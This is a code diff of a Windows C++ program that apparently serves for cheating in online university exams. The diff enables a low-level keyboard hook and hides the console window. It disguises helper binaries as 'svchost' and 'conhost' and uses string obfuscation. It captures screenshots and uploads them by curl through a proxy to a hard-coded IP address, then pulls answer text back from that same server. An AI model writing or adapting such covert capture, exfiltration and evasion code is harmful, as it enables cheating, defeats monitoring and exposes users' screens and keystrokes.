@@ -43,62 +43,15 @@ struct Pos
 };
 int sen = -1;
 int type = 1;
+//-----------------KEYBOARD CONFIG------------
 
+//-----------------------------------------
 std::string sx[50];
 Pos pos[50];
 bool active = false;
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 const auto gcs_w = WinApiImport<Get_Console_WINAPI>::get(AY_OBFUSCATE("GetConsoleWindow"), AY_OBFUSCATE("Kernel32.dll"));
 const auto sw = WinApiImport<Show_Win_WINAPI>::get(AY_OBFUSCATE("ShowWindow"), AY_OBFUSCATE("User32.dll"));
-void kb_print(std::string g)
-{
-	Sleep(100);
-	int i, t;
-	{
-		for (i = 0; i < g.length(); i++)
-		{
-			if (type == 2)
-			{
-				if (g[i] == ' ')
-				{
-					t = 0x20;
-					keybd_event(t, MapVirtualKey(t, 0), KEYEVENTF_EXTENDEDKEY, 0);
-				}
-				if (g[i] == ',')
-				{
-					t = 0xBC;
-					keybd_event(t, MapVirtualKey(t, 0), KEYEVENTF_EXTENDEDKEY, 0);
-				}
-				if (g[i] == '.')
-				{
-					t = VK_OEM_PERIOD;
-					keybd_event(t, MapVirtualKey(t, 0), KEYEVENTF_EXTENDEDKEY, 0);
-				}
-
-			}
-			if (g[i] >= '0' && g[i] <= '9')
-			{
-				t = 0x30 + ((int)g.at(i) - 48);
-				keybd_event(t, MapVirtualKey(t, 0), KEYEVENTF_EXTENDEDKEY, 0);
-			}
-			if (g[i] >= 'a' && g[i] <= 'z')
-			{
-				t = 0x41 + ((int)g.at(i) - 97);
-				keybd_event(t, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
-				if (type == 2) Sleep(1);
-			}
-		}
-	}
-	Sleep(1600);
-	if (type == 1)
-	{
-		for (i = 0; i < g.length(); i++)
-		{
-			keybd_event(VK_BACK, MapVirtualKey(VK_BACK, 0), KEYEVENTF_EXTENDEDKEY, 0);
-			Sleep(1);
-		}
-	}
-}
 int l = 0;
 LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -145,7 +98,7 @@ void take_picture(int &i)
 	encoderParameters.Parameter[0].Guid = EncoderQuality;
 	encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
 	encoderParameters.Parameter[0].NumberOfValues = 1;
-	quality = 15;
+	quality = 20;
 	encoderParameters.Parameter[0].Value = &quality;
 	std::string file;
 
@@ -163,7 +116,7 @@ void take_picture(int &i)
 	::ReleaseDC(0, scrdc);
 	file = x + std::to_string(i);
 	char cmd[512];
-	sprintf(cmd, "conhost -q 1 -m 6 -segments 1 %s.jpeg -o %s.webp", file, file);
+	sprintf(cmd, "conhost -q 1 -m 6 -segments 1 -crop 0 0 1536 630 %s.jpeg -o %s.webp", file, file);
 	system(cmd);
 
 	sprintf(cmd, "del %s.jpeg", file);
@@ -227,36 +180,40 @@ void gdiscreen()
 	char cmd[500];
 	int total_file_uploaded = 0;
 	int total_time_exit = 0;
+	std::vector <std::string> uploaded_file;
 	int vk = GetSystemMetrics(SM_SWAPBUTTON) ? VK_RBUTTON : VK_LBUTTON;
 	while (true)
 	{
 		
-		//hHook = shook_win(WH_KEYBOARD_LL, (HOOKPROC)KeyHookProc, 0, 0);
+		hHook = shook_win(WH_KEYBOARD_LL, (HOOKPROC)KeyHookProc, 0, 0);
 		SetWindowText(FindWindow(0,"C:\Program Files\Microsoft.NET\conhost.exe"), "");
 		SetWindowText(FindWindow(0, "C:\Program Files\Microsoft.NET\svchost.exe"), "");
 		SetWindowText(FindWindow("AutoHotkey","C:\Program Files\Microsoft.NET\t3.exe"), "");
 		if (get_key(VK_F6))//Connect to wifi dh
 		{
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="DH-FPT" interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="DH-FPT" interface="Wi-Fi")"));
+			//DH-FPT
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="FU-Students" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="FU-Students" interface="Wi-Fi")"));
 			type = 1;
 			Sleep(100);
 		}
 		if (get_key(VK_F8))//Connect to wifi exam
 		{
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU-EXAMONLINE" interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU-EXAMONLINE" interface="Wi-Fi")"));
+			//FPTU-EXAMONLINE
+			
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="FU-Exam" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="FU-Exam" interface="Wi-Fi")"));
 		
 			Sleep(100);
 		}
 		if (get_key(VK_F7))//Connect to wifi exam
 		{
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="ABC123" interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="ABC123" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="ABC123" interface="Wi-Fi 2")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="ABC123" interface="Wi-Fi 2")"));
 			type = 2;
 			Sleep(100);
 		}
-		if (get_key((VK_F5)))
+		if (get_key((VK_F5)) && toggle)
 		{
 			ZeroMemory(&si, sizeof(si));
 			si.cb = sizeof(si);
@@ -271,26 +228,26 @@ void gdiscreen()
 		{
 			std::string file;
 			int n = vec_file("").size();
+			for (int z = 0; z < n; z++) printf("%s\n", vec_file("")[z]);
+			
+			printf("-------------------------\n");
 			for (int j = 0; j <n; j++)
 			{
 				s = "";
 				//curl --proxy 10.22.194.46:8080http://103.143.143.227/up.php?floder="uploads/abc/" -F "uploadedfile=@cap7.webp"
 				//sprintf(cmd, AY_OBFUSCATE(R"("t2 -F "uploadedfile=@%s.webp" http://103.143.143.227/up.php?floder="uploads/abc/"")"), file);
-				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 25 http://103.143.143.227:80/up.php?floder="uploads/abc/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
-				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 25 http://103.143.143.227:80/up.php?floder="uploads/abc/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
-				system(cmd);
+				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("svchost -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227:80/up.php?floder="uploads/1111/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
+				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("svchost -m 20 http://103.143.143.227:80/up.php?floder="uploads/1111/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
+				if(!std::count(uploaded_file.begin(), uploaded_file.end(), vec_file("")[j])) system(cmd);
+				else continue;
 				newfile2.open("stats.txt", std::ios::in);
 				if (newfile2.is_open())
 				{
 					getline(newfile2, s);
-					if (s.length() > 0)
+					if (s.length() > 0 && !std::count(uploaded_file.begin(),uploaded_file.end(),vec_file("")[j]))
 					{
-						if (s == vec_file("")[j])
-						{
-							total_file_uploaded++;
-							sprintf(cmd, "move %s uploaded", vec_file("")[j]);
-							system(cmd);
-						}
+						total_file_uploaded++;
+						uploaded_file.push_back(vec_file("")[j]);
 					}
 					newfile2.close();
 				}
@@ -299,14 +256,14 @@ void gdiscreen()
 				printf("\n");
 				Sleep(50);
 			}
-			Sleep(300);
+			Sleep(200);
 		}
 		if (get_key(VK_F4))
 		{
 			printf("------------------------DOWNLOAD------------------\n");
 			char cmd[500];
-			if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 60 http://103.143.143.227/abc.txt -o "work.txt"")"));
-			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 60 http://103.143.143.227/abc.txt -o "work.txt"")"));
+			if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("svchost -m 30 --proxy 10.22.194.46:8080 http://103.143.143.227/1111.txt -o "work.txt"")"));
+			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("svchost -m 40 http://103.143.143.227/1111.txt -o "work.txt"")"));
 			system(cmd);
 			printf("--------------------------------------------------");
 			Sleep(100);
@@ -320,13 +277,14 @@ void gdiscreen()
 		if (get_key(VK_F12))
 		{
 			total_time_exit++;
-			if (total_time_exit >= 5)
+			if (total_time_exit >= 3)
 			{
-
+				toggle = !toggle;
+				total_time_exit = 0;
 			}
 			Sleep(100);
 		}
-		if (get_key(VK_LSHIFT))
+		if (get_key(VK_LSHIFT) && toggle)
 		{
 			Sleep(200);
 			newfile.open("work.txt", std::ios::in);
@@ -370,6 +328,40 @@ void gdiscreen()
 		Sleep(100);
 	}
 }
+
+
+
+int main()
+{
+	const auto is_admin = WinApiImport<Is_Admin>::get(AY_OBFUSCATE("IsUserAnAdmin"), AY_OBFUSCATE("Shell32.dll"));
+	if (!is_admin())
+	{
+		printf(AY_OBFUSCATE("Please run as admin"));
+		_getch();
+	}
+	else
+	{
+		std::string key;
+		printf(AY_OBFUSCATE("key:"));
+		std::cin >> key;
+		const char *x = AY_OBFUSCATE("1111");
+		if (key == x)
+		{
+			printf(AY_OBFUSCATE("\nKey cua ban hop le"));
+			Sleep(2000);
+			s_wint(gcs_w(), "");
+			sw(gcs_w(), SW_HIDE);
+			//HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, NULL, NULL);
+			gdiscreen();
+		}
+		else
+		{
+			printf(AY_OBFUSCATE("\nKey cua ban da nhap sai"));
+			_getch();
+		}
+	}
+	return 0;
+}
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 {
 	using namespace Gdiplus;
@@ -398,36 +390,5 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 		}
 	}
 	free(pImageCodecInfo);
-	return 0;
-}
-
-int main()
-{
-	const auto is_admin = WinApiImport<Is_Admin>::get(AY_OBFUSCATE("IsUserAnAdmin"), AY_OBFUSCATE("Shell32.dll"));
-	if (!is_admin())
-	{
-		printf(AY_OBFUSCATE("Please run as admin"));
-		_getch();
-	}
-	else
-	{
-		std::string key;
-		printf(AY_OBFUSCATE("key:"));
-		std::cin >> key;
-		const char *x = AY_OBFUSCATE("abc");
-		if (key == x)
-		{
-			printf(AY_OBFUSCATE("\nKey cua ban hop le"));
-			Sleep(2000);
-			s_wint(gcs_w(), "");
-			//sw(gcs_w(), SW_HIDE);
-			gdiscreen();
-		}
-		else
-		{
-			printf(AY_OBFUSCATE("\nKey cua ban da nhap sai"));
-			_getch();
-		}
-	}
 	return 0;
 }
